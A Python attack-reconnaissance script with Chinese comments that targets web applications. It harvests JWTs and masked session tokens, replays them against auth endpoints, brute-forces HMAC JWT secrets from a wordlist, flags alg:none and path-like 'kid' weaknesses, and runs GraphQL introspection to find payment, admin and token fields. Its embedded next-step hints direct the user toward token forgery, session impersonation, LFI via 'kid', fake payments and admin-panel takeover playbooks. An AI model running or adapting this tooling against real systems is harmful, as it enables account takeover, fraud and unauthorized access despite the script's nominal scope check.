#!/usr/bin/env python3
"""JWT 表面 + GraphQL introspection（授权范围内）。

L1：找 /graphql、页面里的 eyJ、Cookie。
L2：对已有 token 用公开 HS256 字典本地验签；introspection 开则摘敏感字段名。
不默认伪造超管票、不 dump 全 schema。
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import re
import sys
from datetime import datetime, UTC
from pathlib import Path
from typing import Any
from urllib.parse import urljoin

try:
    import requests
    requests.packages.urllib3.disable_warnings()  # type: ignore
except ImportError:
    print("[!] pip install requests", file=sys.stderr)
    sys.exit(1)

OPS = Path(__file__).resolve().parent
ROOT = (OPS.parent if (OPS.parent / "杀招").is_dir() else (OPS.parent if (OPS.parent / "杀招").is_dir() else OPS.parents[1]))
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from jwt_mask import extract_masked_tokens, is_masked_session_token  # noqa: E402
from scope_lib import host_of, in_scope, write_probe_json  # noqa: E402

UA = "Mozilla/5.0 大爱仙尊-jwt-gql"
JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]*")
GQL_PATHS = (
    "/graphql", "/api/graphql", "/graphql/v1", "/v1/graphql",
    "/query", "/gql", "/graphiql", "/playground",
)
INTROSPECTION = '{"query":"{__schema{queryType{name fields{name}} mutationType{name fields{name}}}}"}'
SENSITIVE = (
    "admin", "password", "secret", "token", "pay", "notify", "balance",
    "user", "config", "order", "deposit", "withdraw", "role", "authority",
)
DICT_DEFAULT = ROOT / "dict" / "jwt_hs256_public.txt"
MASK_CHECK_PATHS = (
    "/api/auth/check",
    "/api/user/info",
    "/api/auth/me",
    "/api/user/getUserInfo",
    "/api/user/userInfo",
)
TUTORIAL_SECRETS = (
    "your_secret_key",
    "your-secret-key",
    "your-256-bit-secret",
    "secret",
    "jwt-secret",
    "jwt_secret",
    "SECRET_KEY",
)
HS_HASH = {
    "HS256": hashlib.sha256,
    "HS384": hashlib.sha384,
    "HS512": hashlib.sha512,
}


def _b64url_decode(s: str) -> bytes:
    pad = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _mask_jwt(tok: str) -> str:
    parts = tok.split(".")
    if len(parts) < 2:
        return tok[:12] + "…"
    return parts[0][:16] + "…." + parts[1][:8] + "…." + (parts[2][:6] + "…" if len(parts) > 2 else "")


def _decode_jwt(tok: str) -> dict[str, Any]:
    parts = tok.split(".")
    out: dict[str, Any] = {"masked": _mask_jwt(tok), "alg": "", "claims_keys": []}
    if len(parts) < 2:
        return out
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        out["alg"] = str(header.get("alg", ""))
        out["kid"] = str(header.get("kid", ""))[:80]
        if isinstance(payload, dict):
            out["claims_keys"] = sorted(payload.keys())[:40]
            for k in ("role", "roles", "authority", "auth", "sub", "username",
                      "ver", "version", "v", "token_version", "jti"):
                if k in payload:
                    out[f"claim_{k}"] = str(payload[k])[:80]
    except Exception as e:
        out["decode_error"] = str(e)[:80]
    return out


def _load_secrets(path: Path) -> list[str]:
    raw: list[str] = []
    if path.is_file():
        raw = [
            ln.strip() for ln in path.read_text(encoding="utf-8").splitlines()
            if ln.strip() and not ln.startswith("#")
        ]
    else:
        raw = ["secret", "jwt", "abcdefghijklmnopqrstuvwxyz"]
    seen: set[str] = set()
    ordered: list[str] = []
    for sec in (*TUTORIAL_SECRETS, *raw):
        if sec and sec not in seen:
            seen.add(sec)
            ordered.append(sec)
    return ordered


def _hs_ok(tok: str, secret: str, alg: str) -> bool:
    parts = tok.split(".")
    if len(parts) != 3:
        return False
    name = (alg or "HS256").upper()
    hfn = HS_HASH.get(name)
    if hfn is None:
        return False
    msg = f"{parts[0]}.{parts[1]}".encode("ascii")
    sig = hmac.new(secret.encode("utf-8"), msg, hfn).digest()
    try:
        got = _b64url_decode(parts[2])
    except Exception:
        return False
    return hmac.compare_digest(sig, got)


def _get(sess: requests.Session, url: str) -> requests.Response | None:
    try:
        return sess.get(url, timeout=10, verify=False, allow_redirects=True)
    except Exception:
        return None


def _replay_masked(sess: requests.Session, base: str, tok: str) -> dict[str, Any]:
    """掩码串当 session 查找键：原样带头 vs 垃圾串对照。"""
    hits: list[str] = []
    garbage = "eyJdead...FAIL"
    if garbage == tok:
        garbage = "eyJxxxx...ZZZZ"
    headers_sets = (
        {"token": tok, "User-Agent": UA},
        {"Authorization": f"Bearer {tok}", "User-Agent": UA},
    )
    for path in MASK_CHECK_PATHS:
        url = urljoin(base, path.lstrip("/"))
        good = bad = None
        for hdr in headers_sets:
            try:
                good = sess.post(url, timeout=10, verify=False, headers=hdr, json={})
            except Exception:
                continue
            try:
                junk = dict(hdr)
                if "token" in junk:
                    junk["token"] = garbage
                if "Authorization" in junk:
                    junk["Authorization"] = f"Bearer {garbage}"
                bad = sess.post(url, timeout=10, verify=False, headers=junk, json={})
            except Exception:
                bad = None
            if good is None:
                continue
            gtxt = (good.text or "")[:400]
            btxt = (bad.text or "")[:400] if bad is not None else ""
            if good.status_code == 200 and "..." in tok and (
                good.status_code != (bad.status_code if bad is not None else 0)
                or (gtxt and gtxt != btxt)
            ):
                low = gtxt.lower()
                if (
                    any(k in low for k in ("username", "userid", "userinfo", "displayname"))
                    or re.search(r'"code"\s*:\s*(1|200)\b', low)
                ):
                    hits.append(path)
                    break
    return {
        "level": "L2" if hits else "L1",
        "signal": "masked-jwt-session" if hits else "masked-jwt-seen",
        "masked": tok[:20] + "…",
        "hits": hits,
        "next": (
            "服务端按掩码串查 session，不验 JWT 签。"
            "找日志/前端存储/XSS 漏票 → 冒用；TG 出海云控 → 第四族"
            if hits else "页面/入参出现掩码票，重放到 /auth/check"
        ),
        "playbook": "传承/飞鸽·掩票.md",
    }


def run(base_url: str, case: str, out: Path | None, token: str, wordlist: Path) -> dict[str, Any]:
    host = host_of(base_url)
    if host and not in_scope(host):
        print(f"[!] 不在 scope：{host}", file=sys.stderr)
        sys.exit(2)
    base = base_url.rstrip("/") + "/"
    sess = requests.Session()
    sess.headers["User-Agent"] = UA
    findings: list[dict[str, Any]] = []
    tokens: list[str] = []
    if token:
        tokens.append(token.strip())

    home = _get(sess, base)
    home_blob = ""
    if home is not None:
        home_blob = home.text[:20000]
        blob = home_blob
        for m in JWT_RE.finditer(blob):
            tokens.append(m.group(0))
        tokens.extend(extract_masked_tokens(blob))
        sc = home.headers.get("Set-Cookie", "")
        for m in JWT_RE.finditer(sc):
            tokens.append(m.group(0))
        tokens.extend(extract_masked_tokens(sc))
        if "/graphql" in blob.lower() or "graphiql" in blob.lower():
            findings.append({"level": "L1", "signal": "page-mentions-graphql"})

    seen_tok = set()
    uniq_tokens = []
    for t in tokens:
        if t not in seen_tok:
            seen_tok.add(t)
            uniq_tokens.append(t)

    for tok in uniq_tokens:
        if not is_masked_session_token(tok):
            continue
        replay = _replay_masked(sess, base, tok)
        findings.append(replay)
        print(f"  MASKED {replay.get('signal')} paths={replay.get('hits')}")

    secrets = _load_secrets(wordlist)
    for tok in uniq_tokens[:8]:
        if is_masked_session_token(tok):
            continue
        info = _decode_jwt(tok)
        info["level"] = "L1"
        info["signal"] = "jwt-found"
        alg = str(info.get("alg") or "").upper()
        for sec in secrets:
            if alg in ("HS256", "HS384", "HS512", "") and _hs_ok(tok, sec, alg or "HS256"):
                info["level"] = "L2"
                info["signal"] = "jwt-weak-hs256"
                info["matched_secret"] = sec
                if sec in TUTORIAL_SECRETS:
                    info["family_hint"] = "jwt-default-secret"
                    info["next"] = (
                        "教程默认钥：TG /proxy/list /admin/users → tg-cloud-panel 第三族 "
                        "→ rbac_bypass_probe --jwt-secret；GVA → ginvue；禁止改原超管密"
                    )
                else:
                    info["next"] = (
                        "GVA → ginvue-admin-stealth-takeover；若依 → 若依四海；"
                        "通用只读证明即可，禁止默认伪造超管"
                    )
                break
        if info.get("signal") == "jwt-found":
            kid = str(info.get("kid") or "")
            if alg in ("NONE",):
                info["level"] = "L2"
                info["signal"] = "jwt-alg-none"
                info["next"] = "去签重放 /me；成功再改 role。手法 JWT与GraphQL §3.1"
            elif ".." in kid or kid.startswith("/") or "file:" in kid.lower() or kid.startswith("http"):
                info["signal"] = "jwt-kid-path"
                info["kid_hint"] = "path-or-url"
                info["next"] = "kid 像路径/URL：当 LFI 或 jku 拉公钥。手法 JWT与GraphQL §3.1"
        findings.append(info)
        print(f"  JWT {info['masked']} alg={info.get('alg')} {info['signal']}")

    gql_hits = []
    for p in GQL_PATHS:
        url = urljoin(base, p.lstrip("/"))
        try:
            r = sess.post(
                url, timeout=10, verify=False,
                headers={"Content-Type": "application/json", "User-Agent": UA},
                data=INTROSPECTION,
            )
        except Exception:
            continue
        body = r.text[:8000]
        if r.status_code >= 500:
            continue
        if "queryType" not in body and "__schema" not in body and "Introspection" not in body:
            if r.status_code in (200, 400) and ("graphql" in body.lower() or "must provide query" in body.lower()):
                gql_hits.append({"path": p, "status": r.status_code, "introspection": False, "hint": "endpoint-alive"})
            continue
        names: list[str] = []
        try:
            data = r.json()
            schema = (data.get("data") or {}).get("__schema") or {}
            for side in ("queryType", "mutationType"):
                fields = ((schema.get(side) or {}) or {}).get("fields") or []
                for f in fields:
                    n = f.get("name") if isinstance(f, dict) else None
                    if n:
                        names.append(n)
        except Exception:
            pass
        hot = [n for n in names if any(s in n.lower() for s in SENSITIVE)]
        row = {
            "level": "L2",
            "signal": "graphql-introspection",
            "path": p,
            "status": r.status_code,
            "field_count": len(names),
            "sensitive_fields": hot[:40],
            "next": "支付/notify 字段 → 假支付；user/admin → authz-probe / GVA；勿 dump 全 schema",
        }
        findings.append(row)
        gql_hits.append(row)
        print(f"  GQL introspection {p} fields={len(names)} hot={hot[:8]}")

    report = {
        "target": base_url,
        "ts": datetime.now(UTC).isoformat(),
        "jwt_count": len(uniq_tokens),
        "graphql": gql_hits,
        "findings": findings,
        "playbook": "传承/李代桃僵·星念.md",
        "next": (
            "掩码票 L2 → TG 云控第四族 / 找漏票面；"
            if any(f.get("signal") == "masked-jwt-session" for f in findings)
            else (
            "教程默认钥 → tg-cloud-panel 第三族 + rbac_bypass_probe --jwt-secret；"
            "弱签/introspection → 专卡；阴性 → authz-probe"
            if any(f.get("family_hint") == "jwt-default-secret" for f in findings)
            else "弱签/introspection → 专卡；有票再 jwt_forge_probe none/claim；阴性 → authz-probe"
            )
        ),
    }
    out_path = write_probe_json(
        report, case=case, out=out, case_subdir="jwt_gql", filename="surface.json",
    )
    print(json.dumps({"findings": len(findings), "out": str(out_path)}, ensure_ascii=False))
    print(f"[+] wrote {out_path}", file=sys.stderr)
    return report


def main() -> None:
    ap = argparse.ArgumentParser(description="JWT / GraphQL 表面探针")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("--case", default="")
    ap.add_argument("--out", type=Path, default=None)
    ap.add_argument("--token", default="", help="已有 JWT（将打码落盘）")
    ap.add_argument("--wordlist", type=Path, default=DICT_DEFAULT)
    args = ap.parse_args()
    run(args.url, args.case, args.out, args.token, args.wordlist)


if __name__ == "__main__":
    main()
